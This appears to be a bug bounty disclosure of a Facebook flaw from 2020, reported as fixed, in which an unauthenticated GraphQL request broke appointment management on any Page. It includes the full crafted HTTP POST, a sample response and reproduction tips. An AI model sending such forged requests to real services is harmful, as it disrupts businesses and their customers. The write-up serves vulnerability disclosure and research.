---
title: Block Appointments Requests for Any Facebook Page
description: Unauthenticated POST to GraphQL could block appointment requests management for any Facebook Page.
date: 2025-6-18 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

### 🧾 Description
An attacker can send a crafted unauthenticated GraphQL POST request that affects the Appointments feature of any target Page.  
This causes the Page's pending appointment requests UI to become unusable (blink/loop) and prevents admins from Accept/Refuse
actions, effectively blocking appointment management for that Page.

**Impact:** Any user (without valid credentials) can disrupt a Page's appointment workflow, affecting businesses that rely on Facebook Appointments to schedule with customers.

---

### ⚙️ Steps to Reproduce

**Preconditions**
- Target Page **PageA** with ID = `{AAA}` has **Appointments** enabled.

**Steps**
1. Enable Appointments on **PageA**.
2. Visit:  
   `https://www.facebook.com/{AAA}/appointments/?tab=REQUESTS`  
   → This page lists **pending appointment requests** for Page admins (Accept/Refuse).
3. From any client (no credentials) send the following **POST** to GraphQL, replacing `{AAA}` values with **PageA**’s ID.

#### 📨 Request
```http
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: https://www.facebook.com
Connection: close

&variables={"input":{"actor_id":{AAA},"appointment_notes":null,"can_send_email":false,"client_mutation_id":0,"consumer_country_code":null,"consumer_phone_number":null,"end_time":1602684000,"page_id":{AAA},"referral_offer_id":null,"referrer_surface":"page","referrer":"primary_cta","request_owner_id":{AAA},"service_id":null,"service_ids":null,"session_id":"","start_time":1602684000}}&server_timestamps=true&doc_id=1991930437582405
```

#### ✅ Response
```json
{
  "data": {
    "services_external_calendar_save_instant_booking_appointment": {
      "request": { "id": "{ID_appointments}" },
      "error": null
    }
  },
  "extensions": { "is_final": true }
}
```

**Note:** If the request fails, adjust `start_time`/`end_time` (Unix epoch seconds) to valid future time slots.

4. Return to the **Appointments** interface and create a new test appointment (or request one).  
5. Observe: You receive a notification. Opening it results in a **blinking/looping** pending page, and admins **cannot manage** any appointments (neither Accept nor Refuse).

---

## Timeline

- **Reported:** October 11, 2020
- **Triaged:** October 11, 2020
- **Fixed:** October 13, 2020
- **Reward:** October 22, 2020

---
